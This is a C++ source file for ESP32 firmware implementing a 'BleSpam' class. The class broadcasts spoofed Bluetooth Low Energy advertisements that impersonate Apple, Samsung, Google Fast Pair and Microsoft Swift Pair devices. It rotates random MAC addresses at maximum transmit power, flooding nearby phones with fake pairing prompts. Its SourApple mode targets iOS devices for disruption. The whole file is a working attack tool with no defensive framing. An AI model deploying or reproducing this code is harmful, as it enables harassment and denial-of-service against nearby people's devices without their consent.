#include "BleSpam.h"
#include <esp_bt.h>
#include <esp_mac.h>
#include <NimBLEBeacon.h>

// Set Bluetooth maximum transmit power based on the ESP32 chip model
#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
#define MAX_TX_POWER ESP_PWR_LVL_P20
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9
#endif

// Static data members initialization
const uint8_t BleSpam::IOS1[] = {0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b, 0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16};
const uint8_t BleSpam::IOS2[] = {0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27, 0x0b, 0x09, 0x02, 0x1e, 0x24};
const DeviceType BleSpam::android_models[] = {
    {0xCD8256}, {0x0000F0}, {0xF00000}, {0x821F66}, {0xF52494}, {0x718FA4}, {0x0002F0}, {0x92BBBD}, {0x000006}, {0x060000}, {0xD446A7}, {0x038B91},
    {0x02F637}, {0x02D886}, {0xF00000}, {0xF00001}, {0xF00201}, {0xF00305}, {0xF00E97}, {0x04ACFC}, {0x04AA91}, {0x04AFB8}, {0x05A963}, {0x05AA91},
    {0x05C452}, {0x05C95C}, {0x0602F0}, {0x0603F0}, {0x1E8B18}, {0x1E955B}, {0x1EC95C}, {0x06AE20}, {0x06C197}, {0x06C95C}, {0x06D8FC}, {0x0744B6},
    {0x07A41C}, {0x07C95C}, {0x07F426}, {0x0102F0}, {0x054B2D}, {0x0660D7}, {0x0103F0}, {0x0903F0}, {0xD99CA1}, {0x77FF67}, {0xAA187F}, {0xDCE9EA},
    {0x87B25F}, {0x1448C9}, {0x13B39D}, {0x7C6CDB}, {0x005EF9}, {0xE2106F}, {0xB37A62}, {0x92ADC9}
};
const WatchModel BleSpam::watch_models[] = {
    {0x1A}, {0x01}, {0x02}, {0x03}, {0x04}, {0x05}, {0x06}, {0x07}, {0x08}, {0x09}, {0x0A}, {0x0B}, {0x0C}, {0x11}, {0x12},
    {0x13}, {0x14}, {0x15}, {0x16}, {0x17}, {0x18}, {0x1B}, {0x1C}, {0x1D}, {0x1E}, {0x20}
};
const int BleSpam::android_models_count = sizeof(BleSpam::android_models) / sizeof(BleSpam::android_models[0]);
const int BleSpam::watch_models_count = sizeof(BleSpam::watch_models) / sizeof(BleSpam::watch_models[0]);

BleSpam::BleSpam() : pAdvertising(nullptr), _spamTaskHandle(NULL), _isRunning(false), _currentMode(NONE) {}

BleSpam::~BleSpam() {
    stop();
}

bool BleSpam::start(EBLEPayloadType type) {
    if (_isRunning) stop();
    _currentMode = SPAM_TYPE;
    _currentSpamType = type;
    _isRunning = true;
    xTaskCreate(this->spamTask, "bleSpamTask", 4096, this, 1, &_spamTaskHandle);
    return _spamTaskHandle != NULL;
}

bool BleSpam::startAll() {
    if (_isRunning) stop();
    _currentMode = SPAM_ALL;
    _isRunning = true;
    xTaskCreate(this->spamTask, "bleSpamTask", 4096, this, 1, &_spamTaskHandle);
    return _spamTaskHandle != NULL;
}

bool BleSpam::startCustom(String spamName) {
    if (_isRunning) stop();
    _currentMode = SPAM_CUSTOM;
    _customSpamName = spamName;
    _isRunning = true;
    xTaskCreate(this->spamTask, "bleSpamTask", 4096, this, 1, &_spamTaskHandle);
    return _spamTaskHandle != NULL;
}

bool BleSpam::startIBeacon(String uuid, uint16_t major, uint16_t minor, uint16_t manufacturerId, int8_t txPower) {
    if (_isRunning) stop();
    _currentMode = IBEACON;
    _iBeaconUUID = uuid;
    _iBeaconMajor = major;
    _iBeaconMinor = minor;
    _iBeaconManufacturerId = manufacturerId;
    _iBeaconTxPower = txPower;
    _isRunning = true;
    xTaskCreate(this->spamTask, "bleSpamTask", 4096, this, 1, &_spamTaskHandle);
    return _spamTaskHandle != NULL;
}

void BleSpam::stop() {
    if (_isRunning && _spamTaskHandle != NULL) {
        _isRunning = false; // Signal the task to stop
        vTaskDelay(pdMS_TO_TICKS(150)); // Wait for the task to process the stop signal
        if (_spamTaskHandle != NULL) {
            vTaskDelete(_spamTaskHandle);
            _spamTaskHandle = NULL;
            // Also ensure BLE is de-initialized if the task was killed abruptly
            if (BLEDevice::getInitialized()) {
                BLEDevice::deinit();
            }
        }
    }
    _currentMode = NONE;
}

bool BleSpam::isRunning() {
    return _isRunning;
}

void BleSpam::spam(EBLEPayloadType type, unsigned long duration_ms) {
    if (start(type)) {
        delay(duration_ms);
        stop();
    }
}

void BleSpam::spamAll(unsigned long duration_ms) {
    if (startAll()) {
        delay(duration_ms);
        stop();
    }
}

void BleSpam::spamCustom(String spamName, unsigned long duration_ms) {
    if (startCustom(spamName)) {
        delay(duration_ms);
        stop();
    }
}

void BleSpam::spamTask(void *param) {
    BleSpam* instance = static_cast<BleSpam*>(param);
    int typeIndex = 0;

    if (instance->_currentMode == IBEACON) {
        instance->executeIBeacon();
        // iBeacon advertisement is continuous, so the task idles here.
        while(instance->_isRunning) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }
    } else {
        // Spamming modes loop
        while (instance->_isRunning) {
            switch (instance->_currentMode) {
                case SPAM_CUSTOM:
                    instance->executeCustomSpam(instance->_customSpamName);
                    break;
                case SPAM_ALL:
                    instance->executeSpam(static_cast<EBLEPayloadType>(typeIndex));
                    typeIndex = (typeIndex + 1) % 5;
                    break;
                case SPAM_TYPE:
                    instance->executeSpam(instance->_currentSpamType);
                    break;
                default:
                    vTaskDelay(pdMS_TO_TICKS(10)); 
                    break;
            }
        }
    }

    // Cleanup when task is about to exit
    if (BLEDevice::getInitialized()) {
        if(instance->pAdvertising && instance->pAdvertising->isAdvertising()){
            instance->pAdvertising->stop();
        }
        BLEDevice::deinit();
    }

    instance->_spamTaskHandle = NULL;
    vTaskDelete(NULL);
}

void BleSpam::generateRandomMac(uint8_t *mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = esp_random() & 0xFF;
    }
    // Ensure the MAC address is a unicast, locally administered random static address
    mac[0] &= 0xFE; // Clear LSB to ensure unicast
    mac[0] |= 0xC2; // Set two MSBs to 11 for random static and second LSB for locally administered
}

const char *BleSpam::generateRandomName() {
    const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int len = rand() % 10 + 1;
    static char randomName[11]; // Static to return a valid pointer
    for (int i = 0; i < len; ++i) {
        randomName[i] = charset[rand() % strlen(charset)];
    }
    randomName[len] = '\0';
    return randomName;
}

BLEAdvertisementData BleSpam::GetUniversalAdvertisementData(EBLEPayloadType Type) {
    BLEAdvertisementData AdvData;

    switch (Type) {
        case Microsoft: {
            const char *Name = generateRandomName();
            uint8_t name_len = strlen(Name);
            uint8_t AdvData_Raw[7 + name_len];
            uint8_t i = 0;
            AdvData_Raw[i++] = 6 + name_len;
            AdvData_Raw[i++] = 0xFF;
            AdvData_Raw[i++] = 0x06;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x03;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x80;
            memcpy(&AdvData_Raw[i], Name, name_len);
            AdvData.addData(std::string((char *)AdvData_Raw, 7 + name_len));
            break;
        }
        case AppleJuice: {
            if (random(2) == 0) {
                uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[random() % (sizeof(IOS1) / sizeof(IOS1[0]))],
                                      0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
                AdvData.addData(std::string((char *)packet, 31));
            } else {
                uint8_t packet[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1,
                                      IOS2[random() % (sizeof(IOS2) / sizeof(IOS2[0]))], 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00,
                                      0x00, 0x00};
                AdvData.addData(std::string((char *)packet, 23));
            }
            break;
        }
        case SourApple: {
            uint8_t packet[17];
            uint8_t i = 0;
            packet[i++] = 16;
            packet[i++] = 0xFF;
            packet[i++] = 0x4C;
            packet[i++] = 0x00;
            packet[i++] = 0x0F;
            packet[i++] = 0x05;
            packet[i++] = 0xC1;
            const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
            packet[i++] = types[random() % sizeof(types)];
            esp_fill_random(&packet[i], 3);
            i += 3;
            packet[i++] = 0x00;
            packet[i++] = 0x00;
            packet[i++] = 0x10;
            esp_fill_random(&packet[i], 3);
            AdvData.addData(std::string((char *)packet, 17));
            break;
        }
        case Samsung: {
            uint8_t model = watch_models[random(watch_models_count)].value;
            uint8_t Samsung_Data[15] = {0x0F, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, model};
            AdvData.addData(std::string((char *)Samsung_Data, 15));
            break;
        }
        case Google: {
            const uint32_t model = android_models[rand() % android_models_count].value;
            uint8_t Google_Data[14] = {
                0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE,
                (uint8_t)((model >> 0x10) & 0xFF), (uint8_t)((model >> 0x08) & 0xFF), (uint8_t)((model >> 0x00) & 0xFF),
                0x02, 0x0A, (uint8_t)((rand() % 120) - 100)
            };
            AdvData.addData(std::string((char *)Google_Data, 14));
            break;
        }
    }
    return AdvData;
}

void BleSpam::executeSpam(EBLEPayloadType type) {
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_base_mac_addr_set(macAddr);

    BLEDevice::init("");
    vTaskDelay(10 / portTICK_PERIOD_MS);

    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    pAdvertising = BLEDevice::getAdvertising();

    BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
    BLEAdvertisementData scanResponseData;
    pAdvertising->addServiceUUID(NimBLEUUID((uint32_t)(random() & 0xFFFFFF)));
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->setScanResponseData(scanResponseData);

    pAdvertising->start();
    vTaskDelay(50 / portTICK_PERIOD_MS);
    pAdvertising->stop();
    vTaskDelay(10 / portTICK_PERIOD_MS);
    BLEDevice::deinit();
}

void BleSpam::executeCustomSpam(String spamName) {
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_base_mac_addr_set(macAddr);

    BLEDevice::init("");
    vTaskDelay(10 / portTICK_PERIOD_MS);

    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    pAdvertising = BLEDevice::getAdvertising();

    BLEAdvertisementData advertisementData;
    advertisementData.setFlags(0x06); // General Discoverable, BR/EDR Not Supported
    advertisementData.setName(spamName.c_str());
    pAdvertising->addServiceUUID(BLEUUID("1812")); // HID Service UUID

    pAdvertising->setAdvertisementData(advertisementData);

    pAdvertising->start();
    vTaskDelay(50 / portTICK_PERIOD_MS);
    pAdvertising->stop();
    vTaskDelay(10 / portTICK_PERIOD_MS);
    BLEDevice::deinit();
}

void BleSpam::executeIBeacon() {
    BLEDevice::init("");
    vTaskDelay(10 / portTICK_PERIOD_MS);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

    pAdvertising = BLEDevice::getAdvertising();

    NimBLEBeacon beacon;
    beacon.setManufacturerId(_iBeaconManufacturerId);
    beacon.setProximityUUID(NimBLEUUID(_iBeaconUUID.c_str()));
    beacon.setMajor(_iBeaconMajor);
    beacon.setMinor(_iBeaconMinor);
    beacon.setSignalPower(_iBeaconTxPower);

    BLEAdvertisementData advertisementData;
    advertisementData.setFlags(0x1A); // General Discoverable, BR/EDR Not Supported
    advertisementData.setManufacturerData(beacon.getData());

    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->setScanResponse(false);
    pAdvertising->start();
}